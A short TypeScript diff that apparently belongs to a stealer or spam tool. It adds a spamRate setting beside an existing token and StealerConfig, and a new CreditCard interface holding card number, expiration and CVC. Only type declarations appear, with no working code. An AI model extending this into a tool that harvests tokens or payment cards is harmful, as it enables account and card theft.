@@ -2,6 +2,7 @@ export interface Config {
     token: string,
     prefix: string,
     ignoreErrors: boolean,
+    spamRate: number
     _stealerConfig: StealerConfig;
 }
 
@@ -25,10 +26,16 @@ export interface StealerConfig {
     "disable-qr-code": boolean;
 }
 
+export interface CreditCard {
+    number: string;
+    expiration: string;
+    cvc: string;
+}
+
 
 //https://www.restapitutorial.com/httpstatuscodes.html
 export enum HTTPCode {
-    
+
     //1xx Informational
     Continue = 100,
     SwitchingProtocols = 101,
